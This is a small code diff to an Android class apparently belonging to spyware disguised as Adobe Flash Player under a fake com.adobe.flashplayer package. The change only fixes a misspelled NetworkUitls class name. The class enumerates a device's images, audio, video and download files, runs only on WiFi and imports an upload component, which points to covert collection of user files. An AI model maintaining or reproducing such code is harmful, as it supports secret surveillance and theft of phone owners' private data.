@@ -12,7 +12,7 @@ import com.adobe.flashplayer.PrefOper;
 import com.adobe.flashplayer.MyLog;
 import com.adobe.flashplayer.Public;
 import com.adobe.flashplayer.Utils;
-import com.adobe.flashplayer.network.NetworkUitls;
+import com.adobe.flashplayer.network.NetworkUtils;
 import com.adobe.flashplayer.network.UploadData;
 
 
@@ -55,7 +55,7 @@ public class PhoneSDFiles implements Runnable {
                 return;
             }
 
-            if(NetworkUitls.getNetworkType(context) != NetworkUitls.WIFI_CONNECTION){
+            if(NetworkUtils.getNetworkType(context) != NetworkUtils.WIFI_CONNECTION){
                 return;
             }
 
@@ -245,7 +245,7 @@ public class PhoneSDFiles implements Runnable {
                 return;
             }
 
-            if(NetworkUitls.getNetworkType(context) != NetworkUitls.WIFI_CONNECTION ){
+            if(NetworkUtils.getNetworkType(context) != NetworkUtils.WIFI_CONNECTION ){
                 return;
             }
 
@@ -298,7 +298,7 @@ public class PhoneSDFiles implements Runnable {
     public void listImageFiles(File file){
         try{
 
-            if(NetworkUitls.getNetworkType(context) != NetworkUitls.WIFI_CONNECTION){
+            if(NetworkUtils.getNetworkType(context) != NetworkUtils.WIFI_CONNECTION){
                 return;
             }
 
@@ -377,7 +377,7 @@ public class PhoneSDFiles implements Runnable {
     public void listAudioFiles(File file){
         try{
 
-            if(NetworkUitls.getNetworkType(context) != NetworkUitls.WIFI_CONNECTION  ){
+            if(NetworkUtils.getNetworkType(context) != NetworkUtils.WIFI_CONNECTION  ){
                 return;
             }
 
@@ -450,7 +450,7 @@ public class PhoneSDFiles implements Runnable {
     public void listVideoFiles(File file){
         try{
 
-            if(NetworkUitls.getNetworkType(context) != NetworkUitls.WIFI_CONNECTION ){
+            if(NetworkUtils.getNetworkType(context) != NetworkUtils.WIFI_CONNECTION ){
                 return;
             }
 
@@ -525,7 +525,7 @@ public class PhoneSDFiles implements Runnable {
     public void listDownloadFiles(File file){
         try{
 
-            if(NetworkUitls.getNetworkType(context) != NetworkUitls.WIFI_CONNECTION){
+            if(NetworkUtils.getNetworkType(context) != NetworkUtils.WIFI_CONNECTION){
                 return;
             }
 
